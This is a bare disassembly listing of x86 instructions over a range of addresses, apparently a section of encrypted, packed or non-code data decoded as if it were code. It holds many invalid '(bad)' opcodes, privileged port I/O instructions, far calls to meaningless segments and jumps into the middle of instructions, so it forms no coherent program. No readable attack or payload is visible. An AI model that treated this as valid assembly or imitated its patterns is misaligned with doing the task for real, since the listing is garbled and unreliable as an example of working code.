  41205e:	arpl   WORD PTR [edi+ebp*1+0x1d578108],ax
  412065:	cmp    eax,0x9bc96bba
  41206a:	scas   eax,DWORD PTR es:[edi]
  41206b:	pop    ss
  41206c:	cli    
  41206d:	in     al,dx
  41206e:	rol    DWORD PTR [esi-0x42b99018],cl
  412074:	inc    esi
  412075:	sub    bl,0x48
  412078:	xlat   BYTE PTR ds:[ebx]
  412079:	out    dx,al
  41207a:	std    
  41207b:	(bad)  
  41207c:	fwait
  41207d:	in     al,dx
  41207e:	jne    0x4120c9
  412080:	adc    al,0x31
  412082:	mov    ecx,0xacfdd596
  412087:	mov    bl,BYTE PTR [esi-0x6dfcc646]
  41208d:	jecxz  0x412068
  41208f:	cmp    cl,BYTE PTR [ecx-0x13]
  412092:	and    ecx,DWORD PTR ds:0xc0b3a62b
  412098:	sbb    bh,ah
  41209a:	sub    al,al
  41209c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41209e:	(bad)  [edx]
  4120a0:	hlt    
  4120a1:	hlt    
  4120a2:	xchg   BYTE PTR [ebp+0x16752ea7],dh
  4120a8:	sbb    al,BYTE PTR [ebp-0x276a1c9]
  4120ae:	sub    DWORD PTR [ecx-0xd13491c],edx
  4120b4:	sub    BYTE PTR [ebx+ecx*4-0x20],0xdb
  4120b9:	push   ebp
  4120ba:	in     eax,dx
  4120bb:	call   0xc96d:0xf64aa258
  4120c2:	jno    0x412060
  4120c4:	mov    esp,0x114489ad
  4120c9:	xchg   ebp,eax
  4120ca:	imul   eax,DWORD PTR gs:[ebx],0xffffff96
  4120ce:	xlat   BYTE PTR ds:[ebx]
  4120cf:	sbb    dl,BYTE PTR [ecx+ebx*1]
  4120d2:	rcl    BYTE PTR [ecx],0x5c
  4120d5:	jb     0x41207f
  4120d7:	pushf  
  4120d8:	rol    DWORD PTR [edx-0x3e],cl
  4120db:	sub    DWORD PTR [edi-0x61b653ac],0x29
  4120e2:	pop    esp
  4120e3:	call   0x339f:0x4858e247
  4120ea:	icebp  
  4120eb:	jb     0x4120ce
  4120ed:	mul    DWORD PTR [ebx-0x49766101]
  4120f3:	sahf   
  4120f4:	dec    eax
  4120f5:	in     al,dx
  4120f6:	dec    dl
  4120f8:	(bad)
  4120fc:	dec    ebp
  4120fd:	and    DWORD PTR [esi+0x79],ebp
  412100:	cdq    
  412101:	pop    ds
  412102:	jmp    0x3d1fa696
  412107:	mov    al,ds:0x6d18147f
  41210c:	stos   DWORD PTR es:[edi],eax
  41210d:	nop
  41210e:	sbb    eax,0x3912e95c
  412113:	add    ebp,DWORD PTR [ecx-0x234a9ee3]
  412119:	ds sub al,0xc7
  41211c:	xor    esp,DWORD PTR [esi-0x29]
  41211f:	pop    esp
  412120:	cmp    al,0x0
  412122:	shl    ch,1
  412124:	mov    ?,WORD PTR ds:0xc4dd3439
  41212a:	pusha  
  41212b:	ret    0xb8a8
  41212e:	or     al,0x68
  412130:	xchg   ecx,eax
  412131:	(bad)  
  412132:	inc    esp
  412133:	lock jbe 0x4120ca
  412136:	push   eax
  412137:	loope  0x412182
  412139:	pop    edx
  41213a:	jns    0x4120e7
  41213c:	jmp    0x412109
  41213e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213f:	nop
  412140:	mov    cl,0x4b
  412142:	mov    esp,0xa66f849b
  412147:	je     0x412121
  412149:	jnp    0x412186
  41214b:	call   0x7d6b:0x4007a0c8
  412152:	call   0x8455:0x3d525dd1
  412159:	fist   DWORD PTR [esp+edi*2]
  41215c:	pop    edx
  41215d:	dec    edx
  41215e:	nop
  41215f:	sub    BYTE PTR [esi+eiz*4-0x5b],bl
  412163:	out    0xdb,eax
  412165:	inc    eax
  412166:	mov    ebp,0xd4bbd7ab
  41216b:	xchg   di,ax
  41216d:	sub    DWORD PTR [esp+ecx*8],0xffffff9f
  412171:	jmp    DWORD PTR fs:[esi+0x14]
  412175:	retf   0x3564
  412178:	mov    ds:0xb4f7e117,eax
  41217d:	out    dx,eax
  41217e:	gs xor eax,0xc3ecb773
  412184:	cmp    DWORD PTR [edi-0x5d],edi
  412187:	jno    0x412131
  412189:	aaa    
  41218a:	jb     0x412198
  41218c:	pop    ds
  41218d:	mov    ebp,0xdc1f9b44
  412192:	xlat   BYTE PTR ds:[ebx]
  412193:	cld    
  412194:	arpl   WORD PTR [edi+0x1c],bx
  412197:	rcl    edi,1
  412199:	xor    al,0x9c
  41219b:	jno    0x4121fa
  41219d:	cmp    eax,0x9dc8ed0b
  4121a2:	mov    esp,0x20798899
  4121a7:	pop    es
  4121a8:	enter  0xf9a9,0x65
  4121ac:	pop    edi
  4121ad:	cdq    
  4121ae:	push   esi
  4121af:	lahf   
  4121b0:	dec    edi
  4121b1:	jge    0x412138
  4121b3:	jecxz  0x4121a3
  4121b5:	(bad)  
  4121b6:	jb     0x412162
  4121b8:	fldenv [eax]
  4121ba:	inc    esi
  4121bb:	enter  0xec3e,0xc7
  4121bf:	addr16 lahf 
  4121c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121c3:	mov    BYTE PTR [ecx+ebx*2+0x51],bh
  4121c7:	shl    DWORD PTR [eax],cl
  4121c9:	dec    edx
  4121ca:	shr    eax,cl
  4121cc:	ss inc edx
  4121ce:	jecxz  0x412162
  4121d0:	in     eax,0x33
  4121d2:	pop    es
  4121d3:	cmp    esp,DWORD PTR [ebx]
  4121d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d6:	cmc    
  4121d7:	fld    TBYTE PTR [ebx+eax*1+0x3f]
  4121db:	adc    eax,0x2111ac4
  4121e0:	ds jle 0x4121a7
  4121e3:	xor    BYTE PTR [esi-0x7d],0xf3
  4121e7:	scas   eax,DWORD PTR es:[edi]
  4121e8:	mov    al,ds:0xf70e9f50
  4121ed:	mov    ecx,0x1c90d237
  4121f2:	cs mov esp,0x67c9c18d
  4121f8:	mov    ch,0xd3
  4121fa:	or     BYTE PTR [esi],0xd5
  4121fd:	jmp    0xb499fd8
  412202:	dec    eax
  412203:	scas   eax,DWORD PTR es:[edi]
  412204:	cmp    BYTE PTR [esp+eax*8],dh
  412207:	pop    eax
  412208:	aam    0x3c
  41220a:	in     al,0x94
  41220c:	adc    al,0x61
  41220e:	cs jp  0x4121bc
  412211:	in     eax,0xf2
  412213:	arpl   WORD PTR [ebp+0x708b14b1],bx
  412219:	sbb    eax,DWORD PTR [esi+0x33125db7]
  41221f:	punpckhwd mm2,QWORD PTR [ebx]
  412222:	jns    0x4121ba
  412224:	sbb    DWORD PTR [ebp+0x30],esi
  412227:	pop    ebx
  412228:	stc    
  412229:	(bad)  
  41222a:	mov    bh,0xa
  41222c:	push   0xffffffee
  41222e:	xchg   edx,eax
  41222f:	sbb    eax,0x328050ec
  412234:	fidiv  WORD PTR [eax+0x49aa3779]
  41223a:	adc    eax,0xd51d5d2a
  41223f:	jns    0x41221b
  412241:	push   es
  412242:	sub    ecx,ebx
  412244:	addr16 cld 
  412246:	xor    al,0xca
  412248:	mov    ds:0xae3ea8f1,al
  41224d:	popa   
  41224e:	lahf   
  41224f:	(bad)  
  412250:	pop    esi
  412251:	lock mov ecx,0x1af357d0
  412257:	lds    eax,FWORD PTR [edx]
  412259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41225a:	call   0xe7da:0xee5b50
  412261:	loopne 0x4122a0
  412263:	mov    al,0x9e
  412265:	mov    cl,0xcf
  412267:	(bad)  
  412268:	aam    0x21
  41226a:	jbe    0x4122ea
  41226c:	lock push ebx
  41226e:	cmp    eax,0x92c869ae
  412273:	push   es
  412274:	mov    ebx,0xb9736b76
  412279:	xor    ebx,DWORD PTR [esi-0x39]
  41227c:	xchg   esp,ebp
  41227e:	fimul  DWORD PTR [edx-0x3aa7613a]
  412284:	js     0x4122b7
  412286:	in     eax,0xb4
  412288:	aam    0xdb
  41228a:	mov    esp,0x1a9c8118
  41228f:	push   ebx
  412290:	mov    ch,0x94
  412292:	pusha  
  412293:	lds    esi,FWORD PTR [edx-0x2702a041]
  412299:	ja     0x412312
  41229b:	hlt    
  41229c:	xchg   edx,eax
  41229d:	enter  0x16b,0x1b
  4122a1:	sbb    BYTE PTR [ebx+0x4aca2212],dh
  4122a7:	imul   esp,DWORD PTR [edi-0x6c645626],0x1cb7951c
  4122b1:	jae    0x4122ea
  4122b3:	mov    edi,ebp
  4122b5:	pushf  
  4122b6:	mov    ds:0xf4b074c2,eax
  4122bb:	fcom   DWORD PTR [edx]
  4122bd:	in     eax,0x39
  4122bf:	inc    ebx
  4122c0:	push   ss
  4122c1:	repnz outs dx,BYTE PTR ds:[esi]
  4122c3:	stos   BYTE PTR es:[edi],al
  4122c4:	xchg   ebp,eax
  4122c5:	and    eax,0x6aa339d9
  4122ca:	mov    ah,0x9c
  4122cc:	adc    DWORD PTR [esi-0x62],esi
  4122cf:	adc    ah,0x9e
  4122d2:	pop    ebx
  4122d3:	test   dl,al
  4122d5:	mov    eax,ds:0x312ec0ac
  4122da:	cmc    
  4122db:	jmp    0x4122da
  4122dd:	cwde   
  4122de:	sub    DWORD PTR [edi],ecx
  4122e0:	jmp    0x41229e
  4122e2:	and    al,0x8d
  4122e4:	mov    ch,0x7
  4122e6:	pop    esp
  4122e7:	stos   DWORD PTR es:[edi],eax
  4122e8:	xchg   esi,eax
  4122e9:	test   DWORD PTR [ebp+eiz*2-0x2f09ecba],ebp
  4122f0:	retf   
  4122f1:	dec    ebx
  4122f2:	push   eax
  4122f3:	sar    BYTE PTR [ebx],0x3b
  4122f6:	lock or ecx,DWORD PTR [edx]
  4122f9:	mov    cl,0x7
  4122fb:	xor    ecx,DWORD PTR [ebx]
  4122fd:	cmp    BYTE PTR [esi+ebx*1],dl
  412300:	jle    0x4122ef
  412302:	jmp    0x5021:0x9e243cd9
  412309:	test   eax,0x65c760b8
  41230e:	or     edi,DWORD PTR [ebx+edx*4-0x57]
  412312:	jmp    0x4122fc
  412314:	nop
  412315:	enter  0x8af4,0x1
  412319:	jle    0x41234c
  41231b:	fsub   st(6),st
  41231d:	xchg   ebp,eax
  41231e:	in     eax,0xae
  412320:	push   ebx
  412321:	pusha  
  412322:	test   esp,eax
  412324:	loop   0x4122f2
  412326:	jne    0x41239a
  412328:	xchg   esp,eax
  412329:	mov    ch,0xff
  41232b:	out    0x6c,eax
  41232d:	mov    bh,0x7
  41232f:	in     eax,dx
  412330:	add    eax,0x5d916433
  412335:	and    ebx,ebp
  412337:	cmp    al,0x70
  412339:	sbb    DWORD PTR [edx],0x69
  41233c:	rcr    BYTE PTR [edx],cl
  41233e:	add    eax,0x9bc4de1a
  412343:	adc    BYTE PTR [edx],cl
  412345:	sahf   
  412346:	outs   dx,BYTE PTR ds:[esi]
  412347:	aad    0x96
  412349:	repz cmp BYTE PTR [ebx-0x17],bl
  41234d:	std    
  41234e:	sbb    eax,0x7af43245
  412353:	inc    esi
  412354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412355:	add    DWORD PTR [esp+ebp*4],edx
  412358:	push   edi
  412359:	fsub   st,st(1)
  41235b:	out    dx,eax
  41235c:	sub    esi,edi
  41235e:	int3   
  41235f:	mov    edx,0x92a538ab
  412364:	outs   dx,BYTE PTR ds:[esi]
  412365:	xor    BYTE PTR [ebp+0x38],bh
  412368:	mov    ecx,0x9e18138b
  41236d:	sti    
  41236e:	loop   0x412308
  412370:	or     eax,0x28b055c4
  412375:	dec    ebp
  412376:	pop    esp
  412377:	call   0xa9ca401e
  41237c:	arpl   WORD PTR [edi-0x5c4a98fc],cx
  412382:	fnstenv [ebp-0x1b]
  412385:	fcomp  QWORD PTR [edx-0x2a]
  412388:	je     0x4123ad
  41238a:	xor    eax,0xfb2f03dd
  41238f:	lea    eax,[ecx+0x30cb0f4a]
  412395:	pop    esi
  412396:	pop    ebp
  412397:	(bad)  
  412398:	mov    dh,0xed
  41239a:	xor    DWORD PTR [esi],ecx
  41239c:	smsw   edx
  41239f:	dec    ebp
  4123a0:	and    dl,0xf
  4123a3:	inc    ecx
  4123a4:	pop    ss
  4123a5:	aam    0x37
  4123a7:	iret   
  4123a8:	jns    0x412407
  4123aa:	data16 and bl,0x6c
  4123ae:	(bad)  
  4123af:	sbb    al,BYTE PTR [ebx+0x19f7e8be]
  4123b5:	cmc    
  4123b6:	mov    esi,0x4f98356a
  4123bb:	dec    ebx
  4123bc:	or     DWORD PTR [edi-0x7a],ebx
  4123bf:	clc    
  4123c0:	mov    ebp,0x67a1b632
  4123c5:	aas    
  4123c6:	xchg   esi,eax
  4123c7:	xchg   dh,cl
  4123c9:	dec    edx
  4123ca:	loope  0x412403
  4123cc:	test   eax,0xac141c66
  4123d1:	push   eax
  4123d2:	jo     0x412393
  4123d4:	(bad)  
  4123d5:	jmp    0x412449
  4123d7:	mov    cl,BYTE PTR [ebx]
  4123d9:	test   dh,0xe6
  4123dc:	div    DWORD PTR [edx-0x22]
  4123df:	pop    ecx
  4123e0:	pop    eax
  4123e1:	scas   eax,DWORD PTR es:[edi]
  4123e2:	cmp    DWORD PTR [ecx],eax
  4123e4:	xlat   BYTE PTR ds:[ebx]
  4123e5:	xchg   ebp,eax
  4123e6:	sub    dl,BYTE PTR [ecx]
  4123e8:	out    dx,eax
  4123e9:	inc    esp
  4123ea:	mov    eax,0x10d0ff5b
  4123ef:	mov    bl,0xf9
  4123f1:	push   cs
  4123f2:	inc    edx
  4123f3:	cmp    BYTE PTR [ecx],cl
  4123f5:	rcr    BYTE PTR [ebx+0x329154f9],1
  4123fb:	fld    st(5)
  4123fd:	retf   0xedfb
  412400:	add    eax,0x33c29490
  412405:	lods   eax,DWORD PTR ds:[esi]
  412406:	mov    edx,DWORD PTR [eax+0x11]
  412409:	loop   0x412405
  41240b:	cmc    
  41240c:	dec    edx
  41240d:	idiv   ecx
  41240f:	out    dx,eax
  412410:	pusha  
  412411:	push   eax
  412412:	sti    
  412413:	stos   DWORD PTR es:[edi],eax
  412414:	mov    esp,0xe022ae67
  412419:	push   ebx
  41241a:	not    ah
  41241c:	int3   
  41241d:	sbb    eax,0xb4caf3b0
  412422:	aaa    
  412423:	in     al,0xbb
  412425:	popf   
  412426:	stos   BYTE PTR es:[edi],al
  412427:	mov    DWORD PTR [eax+0x6],ecx
  41242a:	ss push ecx
  41242c:	mov    bl,0x9a
  41242e:	inc    ecx
  41242f:	ss push ecx
  412431:	(bad)  
  412432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412433:	popf   
  412434:	das    
  412435:	pop    esp
  412436:	xchg   DWORD PTR [ebx],edi
  412438:	pop    esp
  412439:	scas   al,BYTE PTR es:[edi]
  41243a:	jnp    0x4123cc
  41243c:	cli    
  41243d:	rol    edx,1
  41243f:	cmp    dh,ch
  412441:	adc    BYTE PTR [edi],bh
  412443:	rol    DWORD PTR [esi-0x203bad4e],0x31
  41244a:	lea    ebx,[edx+0x64e96636]
  412450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412451:	aaa    
  412452:	mov    al,ds:0x119d12b4
  412457:	cmp    BYTE PTR [edi],bl
  412459:	and    esp,DWORD PTR [ebx]
  41245b:	dec    esi
  41245c:	ins    BYTE PTR es:[edi],dx
  41245d:	enter  0x5a86,0x1a
  412461:	fwait
  412462:	xchg   esi,eax
  412463:	shr    BYTE PTR [ebp+eiz*8+0x7faa2da6],0x18
  41246b:	jmp    0xc00c1f34
  412470:	loope  0x41247b
  412472:	jbe    0x41242d
  412474:	pop    es
  412475:	data16 (bad) 
  412477:	and    ch,BYTE PTR [edx-0x30055b00]
  41247d:	push   0x7a19bd25
  412482:	in     al,dx
  412483:	mov    eax,ds:0x62ef0d6e
  412488:	mov    WORD PTR [eax-0x4a1561e9],ss
  41248e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41248f:	test   BYTE PTR [esi+0x34141531],dh
  412495:	les    edi,FWORD PTR ds:0xa700269c
  41249b:	xor    eax,0x26994060
  4124a0:	sub    DWORD PTR [ebp+0x2a],ecx
  4124a3:	mov    ch,0xc8
  4124a5:	call   DWORD PTR [ebp+0x601658d9]
  4124ab:	adc    edx,ebx
  4124ad:	mov    al,0x9d
  4124af:	sub    BYTE PTR [esp+ebx*4+0xf78c61c],bl
  4124b6:	sbb    esi,DWORD PTR [ecx-0x50563e7e]
  4124bc:	sti    
  4124bd:	xor    al,0xa4
  4124bf:	test   BYTE PTR [ecx],ch
  4124c1:	cmp    dl,BYTE PTR [ebp-0x11]
  4124c4:	(bad)  
  4124c5:	loope  0x412472
  4124c7:	stos   BYTE PTR es:[edi],al
  4124c8:	xor    al,0xc2
  4124ca:	adc    DWORD PTR [ebp+0x2ed57905],0xffffffd9
  4124d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124d2:	add    esi,DWORD PTR [ecx-0x66bbe82f]
  4124d8:	adc    bl,BYTE PTR [esi+0x49]
  4124db:	cmp    al,0x64
  4124dd:	loopne 0x4124a2
  4124df:	push   eax
  4124e0:	and    DWORD PTR [eax-0x5c],0x16
  4124e4:	bound  ebp,QWORD PTR [esi+0x3408a5a5]
  4124ea:	or     al,0xe
  4124ec:	sbb    edx,0x40
  4124ef:	cdq    
  4124f0:	xor    ah,ah
  4124f2:	mov    eax,esp
  4124f4:	imul   edi,DWORD PTR [edx+ebx*8+0x20],0x2c
  4124f9:	mov    ds,ebx
  4124fb:	out    0xb2,al
  4124fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124fe:	int    0x5f
  412500:	(bad)  
  412501:	or     ch,BYTE PTR [ebp+0x40]
  412504:	push   eax
  412505:	cmp    BYTE PTR [ecx+0x53],0x39
  412509:	adc    al,0xd8
  41250b:	ds int3 
  41250d:	fucomp st(2)
  41250f:	xor    BYTE PTR [edi-0x76afcaf5],cl
  412515:	add    DWORD PTR ds:[ecx+eiz*8+0x33568744],edi
  41251d:	ja     0x4124a2
  41251f:	shl    DWORD PTR [edx-0x21],cl
  412522:	mov    WORD PTR [edi+0x4],ss
  412525:	inc    ecx
  412526:	inc    ecx
  412527:	(bad)  
  412528:	lea    ebx,[eax-0x28]
  41252b:	push   eax
  41252c:	cmp    ch,BYTE PTR [edx-0x57ccf2ef]
  412532:	cdq    
  412533:	jae    0x412599
  412535:	sbb    DWORD PTR [esi],ebx
  412537:	and    DWORD PTR [ebx+0x17],ebp
  41253a:	lods   al,BYTE PTR ds:[esi]
  41253b:	mov    ah,0x95
  41253d:	inc    ebx
  41253e:	push   ebx
  41253f:	shl    DWORD PTR [edx],1
  412541:	popf   
  412542:	adc    bh,dl
  412544:	mov    al,ds:0xcaba6450
  412549:	or     esp,DWORD PTR [eax-0x4c]
  41254c:	popf   
  41254d:	sub    ch,cl
  41254f:	test   al,0x1
  412551:	jae    0x4124f3
  412553:	push   ds
  412554:	xor    DWORD PTR [ecx],ecx
  412556:	inc    esi
  412557:	loop   0x41252f
  412559:	and    DWORD PTR [esp+ebx*4+0x8e4a078],ebx
  412560:	(bad)  
  412561:	add    al,0xae
  412563:	mov    edi,0x58d7c394
  412568:	adc    ch,al
  41256a:	or     edx,DWORD PTR [esi]
  41256c:	lahf   
  41256d:	repnz add BYTE PTR [edi-0x71929be1],dl
  412574:	add    dl,BYTE PTR cs:[edi+0x318aa0ab]
  41257b:	or     eax,0xe48c7638
  412580:	xchg   edi,eax
  412581:	or     eax,0xd
  412584:	inc    edx
  412585:	push   ebp
  412586:	adc    al,0xdc
  412588:	pop    edx
  412589:	loop   0x4125d6
  41258b:	inc    esi
  41258c:	add    BYTE PTR [ebx+0x7d],dh
  41258f:	jmp    0x2e56:0xaba5504c
  412596:	mov    bh,0x25
  412598:	loope  0x4125de
  41259a:	aaa    
  41259b:	in     al,0x67
  41259d:	fnstcw WORD PTR [eax+eax*1+0x50]
  4125a1:	cmp    DWORD PTR [ebp-0x35],esp
  4125a4:	sub    dh,BYTE PTR [ebx]
  4125a6:	call   0xfddc:0x734e1ce2
  4125ad:	xor    ebx,DWORD PTR [ebp+0x12]
  4125b0:	jne    0x41261d
  4125b2:	adc    al,BYTE PTR [bx+di-0x41bf]
  4125b7:	cmp    al,BYTE PTR [ecx+0xd]
  4125ba:	xor    ebx,DWORD PTR [esi]
  4125bc:	sbb    DWORD PTR [ebx+0x3e],eax
  4125bf:	ins    BYTE PTR es:[edi],dx
  4125c0:	test   eax,0x3a44e7e4
  4125c5:	sub    BYTE PTR [ebp+0x6b],cl
  4125c8:	outs   dx,BYTE PTR ds:[esi]
  4125c9:	adc    eax,0x5861157d
  4125ce:	add    bh,BYTE PTR [eax+0x1c]
  4125d1:	cs jmp 0x412647
  4125d4:	dec    ebx
  4125d5:	loop   0x412606
  4125d7:	fisub  WORD PTR [ebx]
  4125d9:	mov    ch,0x69
  4125db:	mov    esi,0x8f60798e
  4125e0:	sub    al,0x8e
  4125e2:	sub    DWORD PTR [ebx],ecx
  4125e4:	xor    DWORD PTR [ebp-0x1d],0xffffffc6
  4125e8:	aad    0xd8
  4125ea:	jno    0x4125a0
  4125ec:	or     eax,0x2f91a201
  4125f1:	jbe    0x4125ad
  4125f3:	(bad)  
  4125f4:	loopne 0x412578
  4125f6:	clc    
  4125f7:	xor    dh,BYTE PTR [ebp+0x43]
  4125fa:	mov    cl,0x7
  4125fc:	fcomp  DWORD PTR [eax+ebp*1]
  4125ff:	push   ebp
  412600:	cmc    
  412601:	int    0xe
  412603:	je     0x4125b8
  412605:	adc    DWORD PTR [ebp+0x61],eax
  412608:	sub    BYTE PTR [edx-0x63],0xb
  41260c:	loop   0x41263a
  41260e:	adc    cl,bh
  412610:	outs   dx,DWORD PTR ds:[esi]
  412611:	xchg   esp,eax
  412612:	mov    ah,0x13
  412614:	jae    0x41265a
  412616:	mov    bl,0x5c
  412618:	or     DWORD PTR [edi-0x7250de52],ecx
  41261e:	mov    edx,0xb18391b6
  412623:	sti    
  412624:	cwde   
  412625:	std    
  412626:	xchg   ebp,eax
  412627:	inc    esi
  412628:	xlat   BYTE PTR ds:[ebx]
  412629:	lods   eax,DWORD PTR ds:[esi]
  41262a:	mov    WORD PTR [ebp+0x18],es
  41262d:	rol    bh,1
  41262f:	sti    
  412630:	shl    DWORD PTR [ebx+0x61],0xc6
  412634:	out    0x9a,al
  412636:	sub    edi,DWORD PTR [edx+0x62]
  412639:	in     al,0xa3
  41263b:	pop    edx
  41263c:	inc    esp
  41263d:	cdq    
  41263e:	jge    0x412699
  412640:	int    0x1
  412642:	push   cs
  412643:	shl    BYTE PTR [ebp-0x5d606a85],0xab
  41264a:	enter  0x806c,0x54
  41264e:	popf   
  41264f:	inc    esp
  412650:	outs   dx,BYTE PTR ds:[esi]
  412651:	adc    edx,ecx
  412653:	jl     0x4126a1
  412655:	xor    al,0x1b
  412657:	mov    ch,0xad
  412659:	adc    ah,BYTE PTR [esi-0x45]
  41265c:	add    al,0xf
  41265e:	test   bh,dh
  412660:	mov    WORD PTR [eax+0x31084cbc],fs
  412666:	ret    0x92a8
  412669:	sub    DWORD PTR [esi+esi*8-0x56],ecx
  41266d:	outs   dx,DWORD PTR fs:[esi]
  41266f:	int    0x9f
  412671:	mov    cl,0x8e
  412673:	ror    BYTE PTR [ebx+ebp*1-0x17],1
  412677:	inc    ebx
  412678:	jmp    DWORD PTR [esi]
  41267a:	sub    BYTE PTR [edx+eax*1],0x6a
  41267e:	mov    dl,0xb3
  412680:	call   0xcf0d:0x7674be70
  412687:	xor    BYTE PTR [edx+0x6f6124],dh
  41268d:	mov    eax,ds:0x178fb3c4
  412692:	dec    esp
  412693:	test   DWORD PTR [esi-0x2f9b3e75],edx
  412699:	adc    DWORD PTR [eax+edx*2],0xffffffc8
  41269d:	inc    ebx
  41269e:	scas   eax,DWORD PTR es:[edi]
  41269f:	or     BYTE PTR [ebx-0x5a],bl
  4126a2:	fdiv   DWORD PTR [edx-0x1263b0b6]
  4126a8:	sbb    eax,0x7c3c1ca9
  4126ad:	push   ebp
  4126ae:	lods   eax,DWORD PTR ds:[esi]
  4126af:	shr    BYTE PTR [ebx],0xc0
  4126b2:	and    eax,0xbf14624a
  4126b7:	and    eax,0x2e4824c1
  4126bc:	or     BYTE PTR [ecx-0x2b],bl
  4126bf:	push   0x5d2a55d5
  4126c4:	or     al,0xa9
  4126c6:	ret    0x536c
  4126c9:	test   eax,edx
  4126cb:	inc    edi
  4126cc:	inc    esp
  4126cd:	cdq    
  4126ce:	gs mov ebx,0x22dbadb4
  4126d4:	adc    BYTE PTR [ebx+eiz*2+0x7a],ch
  4126d8:	xor    BYTE PTR ds:[ecx],al
  4126db:	fnsave [eax+ecx*1]
  4126de:	pop    edi
  4126df:	mov    ah,0x40
  4126e1:	mov    edi,0x724477b1
  4126e6:	or     al,bh
  4126e8:	mov    eax,0x8d50b37a
  4126ed:	js     0x41269f
  4126ef:	and    BYTE PTR [ebx],dh
  4126f1:	xor    BYTE PTR [edi+ecx*4],bh
  4126f4:	test   eax,0xa7cadc74
  4126f9:	adc    edi,0x2b
  4126fc:	mov    DWORD PTR [esi+0x45],edx
  4126ff:	repz cmc 
  412701:	pop    ebx
  412702:	cdq    
  412703:	stos   DWORD PTR es:[edi],eax
  412704:	adc    eax,0x191444fa
  412709:	test   DWORD PTR [edx+0xcf31b18],ecx
  41270f:	repz add BYTE PTR [edx+ebx*8],cl
  412713:	xlat   BYTE PTR ds:[ebx]
  412714:	pop    ds
  412715:	jp     0x4126f2
  412717:	jp     0x412726
  412719:	dec    edi
  41271a:	mov    dh,0xdc
  41271c:	push   0x77
  41271e:	lods   eax,DWORD PTR ds:[esi]
  41271f:	inc    ebx
  412720:	sti    
  412721:	int    0x24
  412723:	xor    bh,BYTE PTR [edi+0x1a1fd487]
  412729:	xor    ch,bl
  41272b:	(bad)  
  41272c:	mov    dh,BYTE PTR [edx]
  41272e:	(bad)  
  41272f:	sbb    eax,0x28cd3070
  412734:	aas    
  412735:	sti    
  412736:	xchg   esi,eax
  412737:	scas   eax,DWORD PTR es:[edi]
  412738:	enter  0x38e1,0xfb
  41273c:	xor    DWORD PTR [edx+edi*2],edx
  41273f:	adc    BYTE PTR [esi-0x23],ah
  412742:	xchg   edi,eax
  412743:	ret    
  412744:	retf   
  412745:	imul   DWORD PTR [esi+0x29]
  412748:	shl    BYTE PTR [esi+ecx*4+0x51],cl
  41274c:	inc    ebx
  41274d:	test   ch,dh
  41274f:	pop    esp
  412750:	cmp    dh,BYTE PTR [edi-0x7d]
  412753:	cmp    cl,ah
  412755:	mov    dl,0x16
  412757:	stc    
  412758:	(bad)  
  412759:	scas   eax,DWORD PTR es:[edi]
  41275a:	hlt    
  41275b:	inc    ecx
  41275c:	sub    eax,0xf2a3f82d
  412761:	cmc    
  412762:	jge    0x4126ea
  412764:	push   ecx
  412765:	mov    ebp,0xc67e1938
  41276a:	loop   0x4127c5
  41276c:	sub    DWORD PTR ds:[ebp+0x63b112da],ebp
  412773:	sub    cl,BYTE PTR ds:0xe6c8c93d
  412779:	xchg   ebx,eax
  41277a:	ret    
  41277b:	retf   
  41277c:	jb     0x4127bd
  41277e:	(bad)  [esi+0x1c1cb9b8]
  412784:	scas   al,BYTE PTR es:[edi]
  412785:	jo     0x4127fe
  412787:	push   ss
  412788:	inc    ebx
  412789:	pop    ebx
  41278a:	or     esp,DWORD PTR [ebp-0x73b9b9a1]
  412790:	aam    0xc0
  412792:	sbb    dh,dl
  412794:	pushf  
  412795:	inc    esi
  412796:	push   ebp
  412797:	push   ss
  412798:	mov    eax,ds:0xfe1bb31c
  41279d:	(bad)  
  41279e:	jmp    0x412767
  4127a0:	mov    edx,0x86909a29
  4127a5:	jae    0x412740
  4127a7:	ja     0x41272c
  4127a9:	push   ebp
  4127aa:	xchg   ecx,eax
  4127ab:	daa    
  4127ac:	and    BYTE PTR [ecx-0x673ec429],cl
  4127b2:	or     ah,ch
  4127b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127b5:	fisubr WORD PTR [esi-0x73]
  4127b8:	enter  0x3394,0x20
  4127bc:	adc    al,0x5b
  4127be:	scas   eax,DWORD PTR es:[edi]
  4127bf:	arpl   WORD PTR cs:[ebx],dx
  4127c2:	pop    es
  4127c3:	xchg   ebp,eax
  4127c4:	call   0xa0cd:0x75a006c
  4127cb:	aad    0x56
  4127cd:	mov    esi,0x87c9f35a
  4127d2:	push   ecx
  4127d3:	xor    al,0xc0
  4127d5:	nop
  4127d6:	push   esp
  4127d7:	(bad)  
  4127d8:	shl    BYTE PTR [edi],1
  4127da:	scas   al,BYTE PTR es:[edi]
  4127db:	mov    bl,0x50
  4127dd:	mov    ecx,0x13f82c4
  4127e2:	jg     0x41284b
  4127e4:	shl    BYTE PTR [ecx+0x78d9ea68],1
  4127ea:	dec    edi
  4127eb:	sbb    al,0xd8
  4127ed:	inc    esi
  4127ee:	sahf   
  4127ef:	dec    ecx
  4127f0:	mov    al,0x85
  4127f2:	repz cwde 
  4127f4:	mov    bl,0x70
  4127f6:	fwait
  4127f7:	jmp    0x4127ba
  4127f9:	add    eax,0xf719ffe1
  4127fe:	imul   DWORD PTR [eax+ecx*2]
  412801:	cmc    
  412802:	lods   al,BYTE PTR ds:[esi]
  412803:	or     DWORD PTR [ecx-0x437ab123],ebp
  412809:	js     0x41286c
  41280b:	sar    DWORD PTR es:[esi],1
  41280e:	mov    dh,BYTE PTR [edi-0x71]
  412811:	pop    edx
  412812:	or     al,0x3f
  412814:	mov    WORD PTR [ebx+0x78],ds
  412817:	rol    ebx,1
  412819:	(bad)  [esi+0x47]
  41281c:	inc    ebx
  41281d:	es adc edi,ecx
  412820:	idiv   DWORD PTR [edx]
